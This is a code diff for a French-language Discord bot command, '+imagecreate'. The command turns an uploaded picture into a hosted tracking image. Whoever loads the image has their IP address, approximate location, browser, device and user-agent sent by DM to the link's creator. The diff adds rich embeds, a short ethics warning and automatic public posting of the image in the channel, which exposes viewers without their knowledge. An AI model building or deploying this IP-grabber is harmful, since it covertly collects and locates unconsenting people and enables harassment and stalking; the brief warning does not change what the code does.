@@ -16,17 +16,19 @@ load_dotenv()
 DB_PATH = Path("links.db")
 
 def resolve_base_url() -> str:
+    """Résout l'URL de base depuis les variables d'environnement"""
     raw_url = os.getenv("BASE_URL", "googg.up.railway.app")
     if not raw_url:
-        return "googg.up.railway.app"
+        return "https://googg.up.railway.app"
     parsed = urlparse(raw_url)
     if not parsed.scheme:
-        return f"http://{raw_url}".rstrip("/")
+        return f"https://{raw_url}".rstrip("/")
     return raw_url.rstrip("/")
 
 BASE_URL = resolve_base_url()
 
 def ensure_tables() -> None:
+    """Crée les tables nécessaires si elles n'existent pas"""
     with sqlite3.connect(DB_PATH) as conn:
         cursor = conn.cursor()
         cursor.execute(
@@ -37,7 +39,8 @@ def ensure_tables() -> None:
                 guild_id INTEGER NOT NULL,
                 title TEXT NOT NULL,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                clicks INTEGER DEFAULT 0
+                clicks INTEGER DEFAULT 0,
+                image_data BLOB
             )
             """
         )
@@ -58,15 +61,18 @@ def ensure_tables() -> None:
             )
             """
         )
+        # Vérifier si la colonne image_data existe
         columns = {row[1] for row in cursor.execute("PRAGMA table_info(image_trackers)")}
         if "image_data" not in columns:
             cursor.execute("ALTER TABLE image_trackers ADD COLUMN image_data BLOB")
 
 def generate_id(length: int = 8) -> str:
+    """Génère un ID aléatoire unique"""
     chars = string.ascii_letters + string.digits
     return "".join(secrets.choice(chars) for _ in range(length))
 
 def get_unique_id(cursor: sqlite3.Cursor, max_attempts: int = 20) -> str:
+    """Génère un ID unique qui n'existe pas déjà dans la base"""
     for _ in range(max_attempts):
         candidate = generate_id()
         cursor.execute("SELECT 1 FROM image_trackers WHERE id = ?", (candidate,))
@@ -75,11 +81,15 @@ def get_unique_id(cursor: sqlite3.Cursor, max_attempts: int = 20) -> str:
     raise RuntimeError("Impossible de générer un identifiant unique")
 
 def prepare_image(data: bytes) -> bytes:
+    """Prépare l'image : redimensionne si nécessaire et convertit en PNG"""
     with Image.open(io.BytesIO(data)) as img:
+        # Redimensionner si l'image est trop grande
         if max(img.size) > 2000:
             img.thumbnail((2000, 2000), Image.Resampling.LANCZOS)
+        # Convertir en RGB si nécessaire
         if img.mode != "RGB":
             img = img.convert("RGB")
+        # Sauvegarder en PNG
         buffer = io.BytesIO()
         img.save(buffer, format="PNG")
         return buffer.getvalue()
@@ -91,20 +101,54 @@ class ImageCreate(commands.Cog):
 
     @commands.command(name="imagecreate")
     async def imagecreate(self, ctx, *, title: str = "Image Tracker") -> None:
+        """
+        Crée une image trackée qui envoie l'IP en DM quand quelqu'un la charge
+        Usage: +imagecreate [titre] (joindre une image PNG/JPG)
+        """
+        # Vérifier qu'une image est attachée
         if not ctx.message.attachments:
-            await ctx.send("❌ Veuillez joindre une image PNG/JPG à votre message.")
+            embed = discord.Embed(
+                title="❌ Aucune image détectée",
+                description="Veuillez joindre une image PNG/JPG à votre message.\n\n**Usage:** `+imagecreate Mon Image` (avec image attachée)",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
             return
+
         attachment = ctx.message.attachments[0]
+        
+        # Vérifier le format
         if not attachment.filename.lower().endswith((".png", ".jpg", ".jpeg")):
-            await ctx.send("❌ Seules les images PNG/JPG sont acceptées.")
+            embed = discord.Embed(
+                title="❌ Format invalide",
+                description="Seules les images PNG/JPG sont acceptées.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
             return
+
+        # Vérifier la taille (max 10 MB)
         if attachment.size > 10 * 1024 * 1024:
-            await ctx.send("❌ L'image ne doit pas dépasser 10 MB.")
+            embed = discord.Embed(
+                title="❌ Fichier trop volumineux",
+                description="L'image ne doit pas dépasser 10 MB.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
             return
+
+        # Message de chargement
+        loading_msg = await ctx.send("🔄 Création de l'image trackée en cours...")
+
         async with ctx.typing():
             try:
+                # Télécharger l'image
                 image_bytes = await attachment.read()
+                
+                # Traiter l'image (redimensionner, convertir)
                 processed_image = await asyncio.to_thread(prepare_image, image_bytes)
+                
+                # Sauvegarder dans la base de données
                 with sqlite3.connect(DB_PATH) as conn:
                     cursor = conn.cursor()
                     tracker_id = get_unique_id(cursor)
@@ -121,23 +165,78 @@ class ImageCreate(commands.Cog):
                             processed_image,
                         ),
                     )
+
+                # Générer l'URL trackée
                 image_url = f"{BASE_URL}/image/{tracker_id}"
-                message = (
-                    f"✅ Image tracker créée : {image_url}\n"
-                    f"📸 Image: {title}\n"
-                    "Quand quelqu'un charge cette URL, vous recevrez une notification avec l'IP."
+                
+                # Créer l'embed de succès
+                embed = discord.Embed(
+                    title="✅ Image Tracker Créée !",
+                    description="Votre image trackée est prête !",
+                    color=discord.Color.green()
                 )
+                embed.add_field(
+                    name="📋 Informations",
+                    value=f"**Titre:** {title}\n**ID:** `{tracker_id}`",
+                    inline=False
+                )
+                embed.add_field(
+                    name="🔗 Lien Tracker",
+                    value=f"```{image_url}```",
+                    inline=False
+                )
+                embed.add_field(
+                    name="📊 Comment ça marche ?",
+                    value=(
+                        "Partagez ce lien. Quand quelqu'un charge l'image, vous recevrez une notification DM avec :\n"
+                        "• 📍 **Adresse IP**\n"
+                        "• 🌍 **Localisation** (pays, région, ville)\n"
+                        "• 🖥️ **Navigateur et appareil**\n"
+                        "• 🕐 **Date et heure du clic**\n"
+                        "• 📊 **User-Agent complet**"
+                    ),
+                    inline=False
+                )
+                embed.add_field(
+                    name="💡 Commandes utiles",
+                    value=f"`+imageclicks {tracker_id}` - Voir les statistiques\n`+imagestats` - Voir tous vos trackers",
+                    inline=False
+                )
+                embed.add_field(
+                    name="⚠️ Avertissement",
+                    value="Cette fonctionnalité est à utiliser de manière **éthique et légale** uniquement. Ne l'utilisez pas pour harceler ou traquer quelqu'un.",
+                    inline=False
+                )
+                embed.set_footer(text="Les notifications seront envoyées en DM")
+
+                # Supprimer le message de chargement
+                await loading_msg.delete()
+                
+                # Envoyer le résultat en DM
                 try:
-                    await ctx.author.send(message)
-                    await ctx.send("✅ Image tracker créée — lien envoyé en DM.")
+                    await ctx.author.send(embed=embed)
+                    await ctx.send(f"✅ {ctx.author.mention} Image tracker créée ! Lien envoyé en DM.")
                 except discord.Forbidden:
-                    await ctx.send(f"✅ Image tracker créée : {image_url}")
+                    # Si les DM sont fermés, envoyer dans le canal
+                    await ctx.send(embed=embed)
+
+                # Poster l'image dans le canal (optionnel)
+                if ctx.channel:
+                    public_embed = discord.Embed(
+                        title="🖼️ Nouvelle Image Trackée",
+                        description=f"**{title}**",
+                        color=discord.Color.blue(),
+                    )
+                    public_embed.set_image(url=image_url)
+                    public_embed.set_footer(text=f"Créé par {ctx.author.name} | ID: {tracker_id}")
+                    await ctx.channel.send(embed=public_embed)
+
             except UnidentifiedImageError:
-                await ctx.send("❌ Impossible de lire cette image.")
+                await loading_msg.edit(content="❌ Impossible de lire cette image. Assurez-vous qu'il s'agit d'une image valide.")
             except RuntimeError as error:
-                await ctx.send(f"❌ {error}")
+                await loading_msg.edit(content=f"❌ {error}")
             except Exception as error:
-                await ctx.send(f"❌ Erreur traitement image: {error}")
+                await loading_msg.edit(content=f"❌ Erreur lors du traitement de l'image: {error}")
 
 async def setup(bot) -> None:
     await bot.add_cog(ImageCreate(bot))
